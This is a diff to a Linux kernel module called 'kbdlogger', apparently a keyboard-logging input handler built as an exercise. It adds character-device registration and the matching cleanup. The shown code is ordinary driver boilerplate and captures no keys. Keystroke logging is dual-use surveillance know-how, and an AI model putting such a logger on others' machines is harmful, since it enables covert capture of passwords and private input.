@@ -56,6 +56,10 @@ struct kbdloggerdev {
 
 struct kbdloggerdev *kldev;
 
+static const struct file_operations kldev_fops = {
+	.owner    = THIS_MODULE,
+};
+
 
 static void kldev_release(struct device *dev)
 {
@@ -63,8 +67,8 @@ static void kldev_release(struct device *dev)
 
 static void kbdlogger_cleanup(void)
 {
-	/* cdev_del(&kldev->cdev); */
-
+	cdev_del(&kldev->cdev);
+	device_del(&kldev->dev);
 	input_close_device(&kldev->handle);
 	input_free_minor(MINOR(kldev->dev.devt));
 	input_unregister_handle(&kldev->handle);
@@ -117,9 +121,18 @@ static int kbdlogger_connect(struct input_handler *handler,
 	if (error)
 		goto err_cleanup_kldev;
 
-	/*
-	 * Initialize the cdev struct here
-	 */
+	/* char device setup (struct cdev) */
+	cdev_init(&kldev->cdev, &kldev_fops);
+	kldev->cdev.kobj.parent = &kldev->dev.kobj;
+	error = cdev_add(&kldev->cdev, kldev->dev.devt, 1);
+	if (error)
+		goto err_cleanup_kldev;
+
+
+	/* device registering */
+	error = device_add(&kldev->dev);
+	if (error)
+		goto err_cleanup_kldev;
 
 	error = input_open_device(&kldev->handle);
 	if (error)
